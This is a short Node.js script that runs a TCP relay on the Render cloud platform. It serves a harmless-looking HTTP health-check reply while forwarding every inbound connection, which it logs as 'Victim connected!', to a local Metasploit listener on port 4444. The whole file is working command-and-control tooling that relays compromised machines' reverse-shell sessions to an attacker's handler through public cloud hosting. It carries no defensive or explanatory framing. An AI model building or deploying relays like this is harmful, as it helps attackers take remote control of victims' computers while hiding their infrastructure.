const net = require('net');
const http = require('http');

// Render dynamic port
const PORT = process.env.PORT || 10000;

// HTTP Server for Render health check
const httpServer = http.createServer((req, res) => {
    res.writeHead(200, { 'Content-Type': 'text/plain' });
    res.end('Server is running properly\n');
});

// TCP Proxy Server
const tcpServer = net.createServer((socket) => {
    console.log('Victim connected!');
    // Forwarding to your local Metasploit listener on port 4444
    const client = net.createConnection({ port: 4444, host: 'localhost' });
    
    socket.pipe(client);
    client.pipe(socket);
    
    socket.on('error', (e) => console.log('Socket Error:', e.message));
    client.on('error', (e) => console.log('Client Error:', e.message));
});

// Start proxy on Render's provided port
tcpServer.listen(PORT, '0.0.0.0', () => {
    console.log(`Proxy server is live on port ${PORT}`);
});
